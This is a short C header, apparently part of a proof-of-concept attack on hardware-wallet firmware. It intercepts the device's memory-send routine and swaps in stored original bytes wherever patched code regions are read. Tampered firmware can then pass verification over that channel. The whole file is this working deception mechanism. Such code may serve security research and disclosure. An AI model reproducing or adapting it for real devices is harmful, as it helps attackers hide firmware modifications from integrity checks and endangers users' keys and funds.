#ifndef _UNSEC_H_
#define _UNSEC_H_

#include <stdint.h>

#include "util.h"

typedef struct {
    const uint8_t *address;
    const uint8_t *replacement;
    uint16_t length;
} unsec_region_t;

static inline void io_seproxyhal_unsec_chunk(const uint8_t *buffer, uint16_t length) {
#define GENERATE_FUNCTION(NAME, ADDRESS, REPLACEMENT, SIZE)

#define GENERATE_BRANCH(NAME, ADDRESS, ...) \
    static const RODATA(udivsi3) uint8_t branch_##NAME[4] = { __VA_ARGS__ };

#define GENERATE_NOOP(NAME, ADDRESS, REPLACEMENT)

    SYMBOL_TABLE

#undef GENERATE_FUNCTION
#undef GENERATE_BRANCH
#undef GENERATE_NOOP

    static const RODATA(udivsi3) unsec_region_t regions[] = {
#define GENERATE_FUNCTION(NAME, ADDRESS, REPLACEMENT, SIZE) \
        { (uint8_t *) ADDRESS, (uint8_t *) REPLACEMENT, SIZE },

#define GENERATE_BRANCH(NAME, ADDRESS, ...) \
        { (uint8_t *) ADDRESS, branch_##NAME, 4 },

#define GENERATE_NOOP(NAME, ADDRESS, REPLACEMENT) \
        { (uint8_t *) ADDRESS, noop_##REPLACEMENT, 2 },

        SYMBOL_TABLE

#undef GENERATE_FUNCTION
#undef GENERATE_BRANCH
#undef GENERATE_NOOP
    };

    for (uint8_t i = 0; i < sizeof(regions) / sizeof(*regions); i++) {
        const unsec_region_t *region = &regions[i];

        const uint8_t *end = &region->address[region->length];

        if (buffer < region->address) {
            uint16_t _length = MIN(length, region->address - buffer);

            _real_io_seproxyhal_send(buffer, _length);

            buffer += _length;
            length -= _length;
        }

        if (buffer < end) {
            const uint8_t *_buffer = &region->replacement[buffer - region->address];
            uint16_t _length = MIN(length, end - buffer);

            _real_io_seproxyhal_send(_buffer, _length);

            buffer += _length;
            length -= _length;
        }
    }

    _real_io_seproxyhal_send(buffer, length);
}

#endif /* _UNSEC_H_ */
